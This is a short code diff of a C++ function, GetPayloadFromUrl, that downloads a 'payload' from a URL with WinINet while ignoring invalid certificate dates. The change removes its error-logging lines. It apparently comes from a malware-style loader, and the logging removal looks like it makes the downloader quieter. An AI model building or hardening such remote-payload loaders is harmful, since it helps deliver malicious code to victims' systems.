@@ -18,13 +18,11 @@
 BOOL GetPayloadFromUrl(LPCWSTR szUrl, std::vector<BYTE>& payload) {
     HINTERNET hInternet = InternetOpenW(L"A Custom User Agent", INTERNET_OPEN_TYPE_DIRECT, NULL, NULL, 0);
     if (!hInternet) {
-        std::cerr << "[!] InternetOpenW Failed With Error: " << GetLastError() << std::endl;
         return FALSE;
     }
 
     HINTERNET hInternetFile = InternetOpenUrlW(hInternet, szUrl, NULL, 0, INTERNET_FLAG_HYPERLINK | INTERNET_FLAG_IGNORE_CERT_DATE_INVALID, 0);
     if (!hInternetFile) {
-        std::cerr << "[!] InternetOpenUrlW Failed With Error: " << GetLastError() << std::endl;
         InternetCloseHandle(hInternet);
         return FALSE;
     }
@@ -36,7 +34,6 @@ BOOL GetPayloadFromUrl(LPCWSTR szUrl, std::vector<BYTE>& payload) {
     }
 
     if (bytesRead == 0 && GetLastError() != ERROR_SUCCESS) {
-        std::cerr << "[!] InternetReadFile Failed With Error: " << GetLastError() << std::endl;
         InternetCloseHandle(hInternetFile);
         InternetCloseHandle(hInternet);
         return FALSE;
